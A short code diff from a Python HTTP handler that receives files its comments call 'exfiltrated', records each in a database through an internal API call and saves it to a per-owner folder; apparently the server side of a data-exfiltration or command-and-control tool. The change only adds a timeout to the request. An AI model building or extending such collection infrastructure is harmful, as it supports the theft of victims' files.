@@ -65,7 +65,7 @@ class Handler(BaseHTTPRequestHandler):
 		output_path = os.path.join(OUTPUT_DIR, owner, 'files', filename)
 
 		# add exfiltrated file to database via internal API call
-		requests.post("http://0.0.0.0/api/file/add", {"filename": filename, "owner": owner, "module": module, "session": session})
+		requests.post("http://0.0.0.0/api/file/add", {"filename": filename, "owner": owner, "module": module, "session": session}, timeout=60)
 
 		# save exfiltrated file to user directory
 		with open(output_path, 'wb') as fp:
